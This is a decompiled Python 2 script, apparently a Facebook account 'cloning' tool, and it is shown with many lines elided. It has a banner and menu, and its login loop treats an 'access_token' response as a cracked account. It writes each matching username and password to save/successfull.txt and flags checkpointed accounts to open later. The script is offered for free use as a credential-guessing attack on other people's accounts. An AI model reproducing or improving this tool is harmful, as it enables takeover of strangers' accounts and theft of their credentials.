#Codder HEMAT KHAN JALALZAI
#Edit & Modify With Credit
# uncompyle6 version 3.8.0
#HEMAT KHAN
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Aug  8 2022, 10:31:48) 
...
#JALALZAI
#JALALZAI
# Compiled at: 2022-11-30 19:21:23

#You copied me to be your father
...
print("this tool is free by HEMAT KHAN")
print
psb('\x1b[1;32mYOU ENTERING BD SUPER FAST FB ID CLONING TOOL PLEASE WAIT......THIS TOOL MAKE BY HEMAT KHAN ........-................7.................8..............6.......HEMAT KHAN...............................................')
for n in range(9999):
...
def menu():
    ...
    print 
    print ''
    print'FB OLD ID CLONING [HEMAT]'
    print 50* '-'
    print 'Codder.  : HEMATKHAN'
    print 'AUTHOR   : HEMATKHAN '
    print 'Telegram :  HemtHack'
    print 'GITHUB   : https://github.com/HemtKhan'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[HEMAT-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[HEMAT-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[(HEMAT)Open After 03 Days]\x1b[0m \n'
